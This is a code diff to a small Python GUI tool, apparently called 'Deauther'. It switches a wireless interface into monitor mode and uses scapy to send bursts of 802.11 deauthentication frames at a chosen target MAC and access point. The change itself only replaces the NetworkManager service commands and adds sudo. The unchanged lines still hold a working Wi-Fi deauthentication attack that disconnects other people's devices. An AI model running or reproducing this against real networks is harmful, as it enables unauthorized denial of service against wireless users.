@@ -41,19 +41,19 @@ class MainWindow(QWidget):
       targetmac=self.TargetLine.text()
       countt=int(self.CountLine.text())
 
-      subprocess.call(["service","NetworkManager","stop"])
-      subprocess.call(["ifconfig", interface, "down"])
-      subprocess.call(["iwconfig", interface, "mode", "monitor"])
-      subprocess.call(["ifconfig", interface, "up"])
+      subprocess.call(["systemctl","stop","NetworkManager"])
+      subprocess.call(["sudo","ifconfig", interface, "down"])
+      subprocess.call(["sudo","iwconfig", interface, "mode", "monitor"])
+      subprocess.call(["sudo","ifconfig", interface, "up"])
 
       dot11 = Dot11(addr1=targetmac, addr2=bssid, addr3=bssid)
       packet = RadioTap()/dot11/Dot11Deauth(reason=7)
       sendp(packet, inter=0.1, count=countt, iface=interface, verbose=1)
 
-      subprocess.call(["ifconfig", interface, "down"])
-      subprocess.call(["iwconfig", interface, "mode", "managed"])
-      subprocess.call(["ifconfig", interface, "up"])
-      subprocess.call(["service","NetworkManager","start"])
+      subprocess.call(["sudo","ifconfig", interface, "down"])
+      subprocess.call(["sudo","iwconfig", interface, "mode", "managed"])
+      subprocess.call(["sudo","ifconfig", interface, "up"])
+      subprocess.call(["systemctl","start","NetworkManager"])
       
         
 Deauther=QApplication(sys.argv)
